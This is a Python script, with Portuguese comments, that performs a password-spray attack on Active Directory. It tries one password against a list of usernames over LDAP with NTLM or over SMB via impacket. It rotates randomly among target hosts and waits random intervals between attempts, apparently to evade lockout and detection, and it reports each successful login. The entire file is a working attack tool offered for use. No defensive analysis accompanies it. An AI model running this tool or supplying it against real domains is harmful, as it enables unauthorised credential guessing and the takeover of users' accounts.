import random
import time
import argparse
from ldap3 import Server, Connection, NTLM
from impacket.smbconnection import SMBConnection

def load_users(file_path):
    """Carrega a lista de usuários de um arquivo."""
    with open(file_path, 'r') as file:
        users = file.read().splitlines()
    return users

def ldap_spray(users, password, domain, hosts, delay_range):
    """Realiza password spray via LDAP (para controladores de domínio)."""
    for user in users:
        host = random.choice(hosts)
        server = Server(host, get_info=None)
        conn = Connection(server, user=f"{domain}\\{user}", password=password, authentication=NTLM)
        if not conn.bind():
            print(f"[LDAP] Failed login for {user}@{host}")
        else:
            print(f"[LDAP] Successful login for {user}@{host}")
        conn.unbind()
        time.sleep(random.randint(*delay_range))

def smb_spray(users, password, domain, hosts, delay_range):
    """Realiza password spray via SMB (para servidores que não são controladores de domínio)."""
    for user in users:
        host = random.choice(hosts)
        smb = SMBConnection(host, host)
        try:
            smb.login(user, password, domain)
            print(f"[SMB] Successful login for {user}@{host}")
        except Exception as e:
            print(f"[SMB] Failed login for {user}@{host}: {e}")
        smb.close()
        time.sleep(random.randint(*delay_range))

def main():
    parser = argparse.ArgumentParser(description="Perform a password spray attack against Active Directory or SMB servers.")
    parser.add_argument("--users", required=True, help="File containing list of usernames.")
    parser.add_argument("--password", required=True, help="Password to spray.")
    parser.add_argument("--domain", required=True, help="Domain name.")
    parser.add_argument("--hosts", required=True, nargs='+', help="List of target hosts (domain controllers or SMB servers).")
    parser.add_argument("--protocol", choices=["ldap", "smb"], required=True, help="Protocol to use: ldap (for domain controllers) or smb (for other servers).")
    parser.add_argument("--delay-min", type=int, default=2, help="Minimum delay between requests (in seconds).")
    parser.add_argument("--delay-max", type=int, default=20, help="Maximum delay between requests (in seconds).")
    args = parser.parse_args()

    users = load_users(args.users)
    delay_range = (args.delay_min, args.delay_max)

    if args.protocol == "ldap":
        ldap_spray(users, args.password, args.domain, args.hosts, delay_range)
    elif args.protocol == "smb":
        smb_spray(users, args.password, args.domain, args.hosts, delay_range)

if __name__ == "__main__":
    main()
